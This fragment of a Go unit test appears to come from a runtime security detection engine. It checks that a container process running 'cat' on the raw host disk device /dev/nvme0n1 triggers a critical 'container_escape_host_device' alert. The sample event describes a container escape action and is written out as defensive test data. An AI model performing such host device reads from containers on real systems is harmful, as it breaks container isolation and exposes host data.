		got := ids(engine.Evaluate(event("cat", "/dev/nvme0n1", opOpen,
			&types.EnrichmentInfo{PodName: "web-1"})))
		assert.Equal(t, types.SeverityCritical, got["container_escape_host_device"],
			"the container-case subgroup is an OR over container.id and k8s.pod")
	})
}
